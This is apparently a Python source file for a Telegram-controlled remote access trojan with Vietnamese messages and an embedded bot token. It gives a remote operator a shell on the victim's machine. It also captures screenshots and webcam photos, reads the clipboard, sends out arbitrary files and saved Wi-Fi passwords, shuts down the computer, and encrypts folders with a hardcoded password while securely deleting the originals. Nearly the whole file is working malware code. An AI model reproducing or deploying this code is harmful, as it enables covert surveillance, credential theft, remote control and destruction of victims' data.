import os
import re
import mss
import cv2
import time
import pyttsx3
import instaloader
import telebot
import platform
import clipboard
import subprocess
import pyAesCrypt
import xml.etree.ElementTree as ET
from secure_delete import secure_delete


TOKEN = '6936610195:AAEXgvdMHtq-ixur0B_Z-yg2tgbcLwNd9TQ'  

bot = telebot.TeleBot(TOKEN)
cd = os.path.expanduser("~")
secure_delete.secure_random_seed_init()
bot.set_webhook()


@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, 'Xin chào! Tôi là QB-CPC_bot\n\nđược tạo ra bởi THQ Bao')

@bot.message_handler(commands=['help'])
def help_msg(message):
    help_text = 'Nhập /screen để chụp ảnh màn hình.\n/sys để xem thông tin cấu hình thiết bị.\n/ip để xem địa chỉ ip.\n/cd để điều hương thư mục. \n/ls để xem danh sách. \n/upload [path] để nhận file.\n/crypt [path] cho các tập tin thư mục mật mã. \n /decrypt [path] \n/webcam chụp ảnh \n/lock \n /clipboard dán từ bộ nhớ tạm \n/shell \n/wifi để xem mật khẩu wifi \n/speech [hi] để nói từ thiết bị được ra lệnh, \n/shutdown đế tắt máy tính, \n/instagram [url] để tải ảnh hoặc video từ Instagram, \n/set_instagram_user [username] để thiết lập tên người dùng Instagram, \n/delete_instagram_user để xóa tên người dùng Instagram'
    bot.send_message(message.chat.id, help_text)

@bot.message_handler(commands=['ip'])
def send_ip_info(message):
    try:
        command_ip = "curl ipinfo.io/ip"
        result = subprocess.check_output(command_ip, shell=True)
        public_ip = result.decode("utf-8").strip()
        bot.send_message(message.chat.id, public_ip)
    except:
        bot.send_message(message.chat.id, 'error')

@bot.message_handler(commands=['sys'])
def send_system_info(message):
    system_info = {
        'Platform': platform.platform(),
        'System': platform.system(),
        'Node Name': platform.node(),
        'Release': platform.release(),
        'Version': platform.version(),
        'Machine': platform.machine(),
        'Processor': platform.processor(),
        'CPU Cores': os.cpu_count(),
        'Username': os.getlogin(),
    }
    system_info_text = '\n'.join(f"{key}: {value}" for key, value in system_info.items())
    bot.send_message(message.chat.id, system_info_text)


@bot.message_handler(commands=['ls'])
def list_directory(message):
    try:
        contents = os.listdir(cd)
        if not contents:
            bot.send_message(message.chat.id, "thư mục trống.")
        else:
            response = "Nội dung đường dẫn :\n"
            for item in contents:
                response += f"- {item}\n"
            bot.send_message(message.chat.id, response)
    except Exception as e:
        bot.send_message(message.chat.id, f"Một lỗi đã xảy ra : {str(e)}")


@bot.message_handler(commands=['cd'])
def change_directory(message):
    try:
        global cd 
        args = message.text.split(' ')
        if len(args) >= 2:
            new_directory = args[1]
            new_path = os.path.join(cd, new_directory)
            if os.path.exists(new_path) and os.path.isdir(new_path):
                cd = new_path
                bot.send_message(message.chat.id, f"bạn đang ở : {cd}")
            else:
                bot.send_message(message.chat.id, f"Đường dẫn này không tồn tại, vui lòng thử lại.")
        else:
            bot.send_message(message.chat.id, "Cách sử dụng lệnh chưa đúng. : Dùng /cd [tên thư mục]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Một lỗi đã xảy ra : {str(e)}")


@bot.message_handler(commands=['upload'])
def handle_upload_command(message):
    try:
        args = message.text.split(' ')
        if len(args) >= 2:
            file_path = args[1]

            if os.path.exists(file_path):
           
                with open(file_path, 'rb') as file:
                  
                    bot.send_document(message.chat.id, file)

                bot.send_message(message.chat.id, f"File đã được chuyển đi thành công.")
            else:
                bot.send_message(message.chat.id, "Đường dẫn được chỉ định không tồn tại.")
        else:
            bot.send_message(message.chat.id, "Cách sử dụng lệnh chưa đúng. Dùng /upload [ĐƯỜNG DẪN]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Một lỗi đã xảy ra : {str(e)}")


@bot.message_handler(commands=['crypt'])
def encrypt_folder(message):
    try:

        if len(message.text.split()) >= 2:
            folder_to_encrypt = message.text.split()[1]
            password = "qbcpcofficial"

            for root, dirs, files in os.walk(folder_to_encrypt):
                for file in files:
                    file_path = os.path.join(root, file)
                    encrypted_file_path = file_path + '.crypt'
                  
                    pyAesCrypt.encryptFile(file_path, encrypted_file_path, password)
                   
                    if not file_path.endswith('.crypt'):
                       
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Thư mục được mã hóa và các tệp gốc không được mã hóa đã được xóa thành công một cách an toàn.")
        else:
            bot.send_message(message.chat.id, "Cách dử dụng lệnh chưa đúng. Dùng /crypt [ĐƯỜNG DẪN_THƯ MỤC]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Một lỗi đã xảy ra : {str(e)}")


@bot.message_handler(commands=['decrypt'])
def decrypt_folder(message):
    try:
       
        if len(message.text.split()) >= 2:
            folder_to_decrypt = message.text.split()[1]
            password = "qbcpcofficial"
      
            for root, dirs, files in os.walk(folder_to_decrypt):
                for file in files:
                    if file.endswith('.crypt'):
                        file_path = os.path.join(root, file)
                        decrypted_file_path = file_path[:-6] 
                       
                        pyAesCrypt.decryptFile(file_path, decrypted_file_path, password)               
                        
                        secure_delete.secure_delete(file_path)
            
            bot.send_message(message.chat.id, "Đã giải mã thư mục và xóa thành công các tệp được mã hóa..")
        else:
            bot.send_message(message.chat.id, "Cách dử dụng lệnh chưa đúng. Dùng /decrypt [ĐƯỜNG DẪN THƯ MỤC MÃ HÓA]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Một lỗi đã xảy ra : {str(e)}")


@bot.message_handler(commands=['lock'])
def lock_command(message):
    try:

        result = subprocess.run(["rundll32.exe", "user32.dll,LockWorkStation"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        
        if result.returncode == 0:
            bot.send_message(message.chat.id, "Đã khoá màn hình thành công")
        else:
            bot.send_message(message.chat.id, "Không thể khoá màn hình")
    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra : {str(e)}")

shutdown_commands = [
    ['shutdown', '/s', '/t', '5'],
    ['shutdown', '-s', '-t', '5'],
    ['shutdown.exe', '/s', '/t', '5'],
    ['shutdown.exe', '-s', '-t', '5'],
]

@bot.message_handler(commands=['shutdown'])
def shutdown_command(message):
    try:
        success = False
        for cmd in shutdown_commands:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if result.returncode == 0:
                success = True
                break
        
        if success:
            bot.send_message(message.chat.id, "Tắt nguồn trong 5 giây nữa.")
        else:
            bot.send_message(message.chat.id, "Không thể tắt nguồn.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra : {str(e)}")

@bot.message_handler(commands=['webcam'])
def capture_webcam_image(message):
    try:
        
        cap = cv2.VideoCapture(0)

    
        if not cap.isOpened():
            bot.send_message(message.chat.id, "Lỗi: Không thể mở webcam.")
        else:
            
            ret, frame = cap.read()

            if ret:
                
                cv2.imwrite("webcam.jpg", frame)

              
                with open("webcam.jpg", 'rb') as photo_file:
                    bot.send_photo(message.chat.id, photo=photo_file)
                
                os.remove("webcam.jpg")  
            else:
                bot.send_message(message.chat.id, "Lỗi quá trình ghi ảnh.")

        cap.release()

    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra: {str(e)}")


@bot.message_handler(commands=['speech'])
def text_to_speech_command(message):
    try:
       
        text = message.text.replace('/speech', '').strip()
        
        if text:
           
            pyttsx3.speak(text)
            bot.send_message(message.chat.id, "Đã phát âm thanh thành công.")
        else:
            bot.send_message(message.chat.id, "Sửu dụng như thế này. Utilisez /speech [TEXTE]")
    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra : {str(e)}")


@bot.message_handler(commands=['clipboard'])
def clipboard_command(message):
    try:
      
        clipboard_text = clipboard.paste()

        if clipboard_text:
          
            bot.send_message(message.chat.id, f"Nội dung của bộ nhớ tạm :\n{clipboard_text}")
        else:
            bot.send_message(message.chat.id, "Bộ nhớ tạm trống.")
    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra : {str(e)}")


user_states = {}


STATE_NORMAL = 1
STATE_SHELL = 2

@bot.message_handler(commands=['shell'])
def start_shell(message):
    user_id = message.from_user.id
    user_states[user_id] = STATE_SHELL
    bot.send_message(user_id, "Bây giờ bạn đang ở trong giao diện shell từ xa. Nhập 'exit' để thoát.")

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Đang thoat giao diện shell điều khiển từ xa.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                bot.send_message(user_id, f"Lệnh ra:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                bot.send_message(user_id, f"Lệnh vào:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"Đã có lỗi xảy ra: {str(e)}")

def get_user_state(user_id):
    return user_states.get(user_id, STATE_NORMAL)

@bot.message_handler(func=lambda message: get_user_state(message.from_user.id) == STATE_SHELL)
def handle_shell_commands(message):
    user_id = message.from_user.id
    command = message.text.strip()

    if command.lower() == 'exit':
        bot.send_message(user_id, "Đang thoát trình điều khiển từ xa.")
        user_states[user_id] = STATE_NORMAL
    else:
        try:
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            stdout, stderr = process.communicate()

            if stdout:
                output = stdout.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Lệnh ra:\n{output}")
            if stderr:
                error_output = stderr.decode('utf-8', errors='ignore')
                send_long_message(user_id, f"Lệnh ra lỗi:\n{error_output}")
        except Exception as e:
            bot.send_message(user_id, f"Đã có lỗi xảy ra: {str(e)}")


def send_long_message(user_id, message_text):
    part_size = 4000  
    message_parts = [message_text[i:i+part_size] for i in range(0, len(message_text), part_size)]

    for part in message_parts:
        bot.send_message(user_id, part)


@bot.message_handler(commands=['wifi'])
def get_wifi_passwords(message):
    try:
        
        subprocess.run(['netsh', 'wlan', 'export', 'profile', 'key=clear'], shell=True, text=True)

        
        with open('Wi-Fi-App.xml', 'r') as file:
            xml_content = file.read()

      
        ssid_match = re.search(r'<name>(.*?)<\/name>', xml_content)
        password_match = re.search(r'<keyMaterial>(.*?)<\/keyMaterial>', xml_content)

        if ssid_match and password_match:
            ssid = ssid_match.group(1)
            password = password_match.group(1)

            message_text = f"SSID: {ssid}\nPASS: {password}"
            bot.send_message(message.chat.id, message_text)
            try:
                os.remove("Wi-Fi-App.xml")
            except:
                pass
        else:
            bot.send_message(message.chat.id, "KHÔNG TÌM THẤY.")

    except Exception as e:
        bot.send_message(message.chat.id, f"Đã có lỗi xảy ra : {str(e)}")


try:
    if __name__ == "__main__":
        print('ĐANG ĐỢI THỰC HIỆN LỆNH...')
        try:
            bot.infinity_polling()
        except:
            time.sleep(10)
            pass    

except:
    time.sleep(5)
    pass        